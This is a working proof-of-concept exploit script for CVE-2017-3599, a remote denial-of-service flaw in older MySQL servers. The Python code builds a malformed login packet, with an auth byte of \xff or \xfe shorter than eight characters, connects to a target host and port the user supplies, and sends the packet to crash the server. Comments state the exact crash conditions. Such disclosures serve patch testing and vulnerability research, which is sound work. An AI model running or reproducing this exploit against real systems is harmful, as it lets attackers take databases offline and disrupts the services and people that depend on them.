# Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py
# Exploit Title: Remote MySQL DOS (Integer Overflow)
# Google Dork: N/A
# Date: 13th April 2017
# Exploit Author: Rodrigo Marcos
# Vendor Homepage: https://www.mysql.com/
# Software Link: https://www.mysql.com/downloads/
# Version: 5.6.35 and below / 5.7.17 and below
# Tested on: N/A
# CVE : CVE-2017-3599
&#039;&#039;&#039;
 
import socket 
import sys
from struct import pack
 
&#039;&#039;&#039;
CVE-2017-3599 Proof of Concept exploit code.
 
 
Rodrigo Marcos
 
&#039;&#039;&#039;
 
if len(sys.argv)<2:
 
    print "Usage: python " + sys.argv[0] + " host [port]"
    exit(0)
 
else:
    HOST = sys.argv[1]
 
    if len(sys.argv)>2:
        PORT = int(sys.argv[2]) # Yes, no error checking... living on the wild side!
    else:
        PORT = 3306
 
print "[+] Creating packet..."
 
&#039;&#039;&#039;
3 bytes     Packet lenth
1 bytes     Packet number
 
Login request:
 
Packet format (when the server is 4.1 or newer):
 
Bytes       Content
-----       ----
4           client capabilities
4           max packet size
1           charset number
23          reserved (always 0)
n           user name, \0-terminated
n           plugin auth data (e.g. scramble), length encoded
n           database name, \0-terminated
            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)
n           client auth plugin name - \0-terminated string,
            (if CLIENT_PLUGIN_AUTH is set in the capabilities)
 
&#039;&#039;&#039;
 
# packet_len = &#039;\x64\x00\x00&#039;
 
packet_num = &#039;\x01&#039;
 
#Login request packet
packet_cap = &#039;\x85\xa2\xbf\x01&#039;     # client capabilities (default)
packet_max = &#039;\x00\x00\x00\x01&#039;     # max packet size (default)
packet_cset = &#039;\x21&#039;                # charset (default)
p_reserved = &#039;\x00&#039; * 23            # 23 bytes reserved with nulls (default)
packet_usr =  &#039;test\x00&#039;            # username null terminated (default)
 
packet_auth  = &#039;\xff&#039;           # both \xff and \xfe crash the server
 
&#039;&#039;&#039;
Conditions to crash:
 
1 - packet_auth must start with \xff or \xfe
2 - packet_auth must be shorter than 8 chars
 
The expected value is the password, which could be of two different formats
(null terminated or length encoded) depending on the client functionality.
&#039;&#039;&#039;
 
packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth 
packet_len = pack(&#039;i&#039;,len(packet))[:3]
 
request = packet_len + packet_num + packet
 
print "[+] Connecting to host..."
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print "[+] Connected."
 
except:
    print "[+] Unable to connect to host " + HOST + " on port " + str(PORT) + "."  
    s.close()
    print "[+] Exiting."
    exit(0)
 
print "[+] Receiving greeting from remote host..."
data = s.recv(1024)
print "[+] Done."
 
print "[+] Sending our payload..."
s.send(request)
print "[+] Done."
#print "Our data: %r" % request
 
s.close()

